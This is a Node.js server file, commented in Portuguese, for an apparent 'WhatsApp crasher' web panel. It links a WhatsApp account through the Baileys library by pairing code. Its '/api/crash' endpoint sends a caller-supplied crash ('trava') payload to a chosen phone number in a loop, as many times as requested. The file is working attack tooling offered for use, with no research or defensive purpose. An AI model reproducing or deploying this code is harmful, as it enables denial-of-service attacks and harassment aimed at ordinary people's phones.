const express = require('express');
const http = require('http');
const path = require('path');
const fs = require('fs');
const { default: makeWASocket, useMultiFileAuthState, delay } = require('@whiskeysockets/baileys');
const pino = require('pino');

const app = express();
app.use(express.json());
app.use(express.static(__dirname)); // Serve o index.html e arquivos locais

const PORT = process.env.PORT || 3000;
const server = http.createServer(app);

let sock = null;
let connectionStatus = "DESCONECTADO";
let pairingCodeCache = null;

// Rota para servir o painel HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// API para solicitar conexão e gerar o código de emparelhamento com o número digitado
app.post('/api/connect', async (req, res) => {
    const { phoneNumber } = req.body;
    if (!phoneNumber) {
        return res.status(400).json({ success: false, error: "Número não informado." });
    }

    try {
        const cleanedNumber = phoneNumber.replace(/\D/g, '');
        startWhatsAppSession(cleanedNumber);
        res.json({ success: true, message: "Solicitação de conexão iniciada." });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// API para verificar status e código de emparelhamento
app.get('/api/status', (req, res) => {
    res.json({ status: connectionStatus, pairingCode: pairingCodeCache });
});

// API para disparar o script customizado de trava configurado na engrenagem
app.post('/api/crash', async (req, res) => {
    const { target, qty, payload } = req.body;
    if (!sock || connectionStatus !== "CONECTADO") {
        return res.status(400).json({ success: false, error: "WhatsApp não está conectado." });
    }

    try {
        const jidAlvo = `${target.replace(/\D/g, '')}@s.whatsapp.net`;
        const quantidade = parseInt(qty) || 1;

        // Dispara o payload JSON em loop conforme a quantidade escolhida
        for (let i = 0; i < quantidade; i++) {
            await sock.relayMessage(jidAlvo, payload, { participant: { jid: jidAlvo } });
            await delay(700);
        }

        res.json({ success: true, message: `Disparado com sucesso para ${target}` });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Função principal do Socket Baileys do WhatsApp
async function startWhatsAppSession(phoneNumber) {
    const sessionDir = path.join(__dirname, 'sessao_whatsapp');
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    sock = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.04"]
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            connectionStatus = "DESCONECTADO";
            pairingCodeCache = null;
            setTimeout(() => startWhatsAppSession(phoneNumber), 5000);
        } else if (connection === 'open') {
            connectionStatus = "CONECTADO";
            pairingCodeCache = null;
            console.log("WhatsApp conectado com sucesso!");
        }
    });

    // Solicita o código de emparelhamento se o número foi passado e não está registrado
    if (!state.creds.registered && phoneNumber) {
        await delay(3000);
        try {
            const code = await sock.requestPairingCode(phoneNumber);
            pairingCodeCache = code;
            console.log(`Código de Emparelhamento gerado: ${code}`);
        } catch (error) {
            console.error("Erro ao gerar código de emparelhamento:", error);
        }
    }
}

server.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});
